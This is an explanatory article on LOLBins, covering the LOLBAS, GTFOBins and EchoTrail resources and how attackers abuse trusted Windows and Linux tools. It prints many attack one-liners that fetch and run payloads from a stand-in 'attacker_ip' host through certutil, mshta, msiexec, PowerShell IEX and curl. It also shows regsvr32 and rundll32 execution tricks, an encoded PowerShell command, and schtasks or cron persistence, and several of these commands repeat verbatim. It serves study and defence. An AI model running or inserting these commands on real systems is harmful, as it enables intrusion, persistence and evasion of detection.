LOLBins (living-off-the-land binaries)

What Are LOLBins?

LOLBins (Living Off the Land Binaries) are legitimate, pre-installed executables and scripts—integral parts of the operating system or common software packages—that have normal administrative functions. Their inherent trust (often due to digital signing by the vendor) makes them ideal for attackers who wish to avoid introducing external malicious code. Key characteristics include:

  • Legitimacy: Integral to the OS or installed software.
  • Trust: Whitelisted and trusted by security products.
  • Flexibility: Capable of performing file operations, network communications, code execution, persistence, and more.

Examples:

  • Windows:
    • cmd.exe / powershell.exe: Used to execute scripts or commands.
    • regsvr32.exe: Executes remote payloads via COM objects.
    • wmic.exe: Employed for system management and querying system information.
    • certutil.exe: Used for certificate services and can encode/decode data.
    • schtasks.exe: Helps schedule and manage tasks.
    • rundll32.exe: Executes functions stored in DLL files.
    • mshta.exe :Runs malicious HTML Application (HTA) scripts.
    • bitsadmin.exe: Manages BITS (Background Intelligent Transfer Service) jobs for file transfers.
    • bcdedit.exe: Edits the boot configuration data.
    • net.exe: Performs network operations such as managing user accounts and services.
    • ipconfig.exe: Displays and manages the network configuration.
    • sc.exe: Controls Windows services.
    • tasklist.exe: Lists currently running processes.
    • taskkill.exe: Terminates processes by PID or image name.
    • explorer.exe: Opens the Windows File Explorer interface.
  • Linux/Unix:
    • bash: The default shell for command execution.
    • wget / curl: Tools for retrieving content from web servers.
    • find: Searches for files and directories.
    • cron: Schedules and automates recurring tasks.
    • python / perl: Scripting languages used for automation and various tasks.
    • nc / socat: Networking utilities for transferring data and setting up communication channels.
    • awk: A powerful text processing and data extraction tool.
    • sed: A stream editor for filtering and transforming text.
    • ssh: Secure Shell used for secure remote login and command execution.
    • systemctl: Manages system services and the overall state of the system (common in many Linux distributions).
    • df: Reports file system disk space usage.
    • top: Displays a dynamic real-time view of running processes.
    • rsync: Efficiently synchronizes files and directories between locations.

The LOLBAS Project

The LOLBAS project is a community-driven repository that documents these binaries, scripts, and libraries along with their known abuse cases. It provides a searchable database by binary name, function (using a “/” prefix), or type (using a “#” symbol). This resource is invaluable for both red team operators and defenders to understand and mitigate the risks associated with LOLBins.

GTFOBins

GTFOBins - The Linux version of the LOLBAS project.

EchoTrail

EchoTrail is a web-based platform that catalogs and demonstrates “living off the land binaries” (LOLBins) techniques—search for any binary (e.g. echo, certutil, bitsadmin) to discover its common abuse commands, base file hashes, MITRE ATT&CK mappings, code snippets for offense, and SIEM/Splunk detection guidance all in one place.

How Attackers Abuse LOLBins

Adversaries leverage LOLBins—legitimate system binaries—to camouflage their malicious activities. Their inherent trustworthiness allows them to blend into normal system operations. Common abuse scenarios include:

Code Execution and Payload Delivery

Attackers can use trusted tools to download, encode, or decode malicious payloads:

  • CertUtil Example:

``jsx certutil -URLcache -split -f http://attacker_ip/payload.exe C:\Windows\Temp\payload.exe certutil -encode payload.exe EncodedPayload.txt certutil -decode EncodedPayload.txt decoded_payload.exe ``

Explanation: These commands use CertUtil to download a remote file and perform base64 encoding/decoding to obfuscate the payload.

  • MSBuild Example:

``jsx msbuild.exe /nologo /v:q /p:Configuration=Release C:\Path\To\malicious.proj ``

Explanation: Attackers abuse MSBuild to execute arbitrary code embedded in a malicious project file. The build process interprets and runs embedded commands, thereby bypassing direct execution detections.

  • Msiexec Example:

``jsx msiexec.exe /qn /i http://attacker_ip/malicious.msi ``

Explanation: Msiexec is used to silently install a malicious MSI package from a remote server. This stealthy installation method minimizes user interaction and hides malicious activity under the guise of a legitimate installer.

  • Mshta Example:

``jsx mshta.exe http://attacker_ip/malicious.hta ``

Explanation: Mshta downloads and executes a malicious HTML Application (HTA), which can contain embedded scripts (VBScript or JScript). This fileless attack method allows execution in memory, avoiding file-based detection.

Bypassing Application Whitelisting

By abusing trusted utilities, attackers can execute malicious components without triggering whitelisting alerts:

  • Regsvr32 Example:

``jsx regsvr32.exe /s /n /u /i:http://example.com/file.sct C:\Users\thm\Downloads\malicious.dll ``

Explanation: This command leverages regsvr32 to register a malicious DLL without raising alarms.

Stealth and Indirect Command Execution

Attackers employ indirect methods to spawn processes and hide their actions:

  • WMIC Example:

``jsx wmic.exe process call create calc.exe ``

Explanation: WMIC is used here to indirectly launch an application (Calculator as a proof-of-concept).

  • Rundll32 Example:

``jsx rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication";eval("w=new ActiveXObject('WScript.Shell');w.run('calc');window.close()"); ``

Explanation: This command embeds JavaScript within a DLL call to indirectly execute a command. Although it launches Calculator in this example, attackers can substitute any payload.

  • Indirect Execution via File Explorer Shortcuts:

Attackers may abuse Windows Explorer by creating malicious shortcuts that, when activated, indirectly execute payloads. For instance, a shortcut pointing to calc.exe can be crafted so that Explorer indirectly launches Calculator.

Explanation: This method leverages the trusted nature of Explorer and file shortcuts to bypass security monitoring.

Fileless Attacks

Fileless techniques avoid writing malicious files to disk, making detection more challenging:

  • PowerShell Example:

``jsx powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/script.ps1');" ``

Explanation: The payload is executed directly in memory after downloading a remote script.

Lateral Movement and Persistence

Attackers use legitimate tools to ensure continued access and move laterally within a network:

  • Schtasks Example:

``jsx schtasks.exe /create /sc minute /mo 1 /tn "Updater" /tr "C:\Windows\Temp\malicious.exe" /ru SYSTEM ``

Explanation: A scheduled task is created to run a malicious executable every minute under the SYSTEM account, ensuring persistence.

  • WMIC Remote Process Creation Example:

``jsx wmic /node:"192.168.0.42" /user:"administrator" process call create "cmd.exe /c calc.exe" ``

Explanation: WMIC is used to remotely create a process; in an attack, this benign example (Calculator) would be replaced with a malicious command.

Exploitation in Mixed Environments

Attackers also target Linux/Unix systems using native tools for unauthorized actions and persistence:

  • Curl for Payload Delivery (Linux):

``jsx curl -o /tmp/malicious.sh http://attacker_ip/malicious.sh && chmod +x /tmp/malicious.sh && /tmp/malicious.sh ``

Explanation: This command downloads a malicious shell script, makes it executable, and then runs it.

  • Cron for Persistence (Linux):

``bash echo ' * /tmp/malicious.sh' | crontab - ``

Explanation: This cron job ensures the malicious script runs every minute, providing continuous persistence.

Technical Examples of LOLBins Abuse

CertUtil Abuse

Purpose:

CertUtil is intended for certificate management, yet attackers exploit it for payload delivery and obfuscation.

  • Download and Save a File:

``jsx certutil -URLcache -split -f http://attacker_ip/payload.exe C:\Windows\Temp\payload.exe ``

Explanation: Downloads a remote file and saves it locally.

  • Encode/Decode Files for Obfuscation:

``jsx certutil -encode payload.exe EncodedPayload.txt certutil -decode EncodedPayload.txt decoded_payload.exe ``

Explanation: Base64 encoding/decoding is used to evade signature-based detection.

PowerShell Fileless Execution

Purpose:

PowerShell’s flexibility makes it ideal for executing fileless attacks.

  • Executing a Remote Script:

``jsx powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/script.ps1');" ``

Explanation: Downloads and executes a remote script directly in memory.

  • Obfuscated Command Line:

``jsx powershell -NoProfile -WindowStyle Hidden -EncodedCommand JABzADoAPQAiAEgAZQBsAGwAbwAiADsAIABJAE4AVwBvAEsAZQAgACgATgBlAC0ATwBiAGoAZQBjAHQAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACkAOwAgAEUASQB4ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkAOwA= ``

Explanation: An encoded command is used to hide the malicious payload, complicating detection.

WMIC Remote Execution

Purpose:

WMIC facilitates remote command execution via legitimate channels.

  • Remote Process Creation:

``jsx wmic /node:"192.168.0.42" /user:"administrator" process call create "cmd.exe /c calc.exe" ``

Explanation: Demonstrates remote execution—Calculator is launched as a benign example that could be replaced with a malicious command.

Rundll32 Abuse for Indirect Command Execution

Purpose:

Rundll32 can be manipulated to indirectly execute arbitrary code.

  • JavaScript Execution via MSHTML.dll:

``jsx rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication";eval("w=new ActiveXObject('WScript.Shell');w.run('calc');window.close()"); ``

Explanation: Embeds JavaScript within a DLL call to indirectly launch an application, illustrating how attackers conceal malicious operations.

MSBuild Abuse

Purpose:

MSBuild is a legitimate build engine, yet attackers repurpose it to execute embedded malicious code.

  • Executing a Malicious Project File:

``jsx msbuild.exe /nologo /v:q /p:Configuration=Release C:\Path\To\malicious.proj ``

Explanation: A crafted MSBuild project file can include embedded commands or scripts that, when processed, execute malicious payloads without triggering direct process execution alerts.

Msiexec Abuse

Purpose:

Msiexec is used for installing software via MSI packages. Attackers can misuse it to install malware stealthily.

  • Silent Installation of a Malicious Package:

``jsx msiexec.exe /qn /i http://attacker_ip/malicious.msi ``

Explanation: This command silently installs a malicious MSI package, thereby leveraging the trusted Windows Installer service to deploy malware without user interaction.

Mshta Abuse

Purpose:

Mshta.exe executes HTML Applications (HTAs), which can be abused to run script-based payloads.

  • Executing a Malicious HTA:

``jsx mshta.exe http://attacker_ip/malicious.hta ``

Explanation: Mshta downloads and executes an HTA file containing malicious VBScript or JScript code. This fileless approach allows the payload to run entirely in memory, bypassing traditional file-based detections.
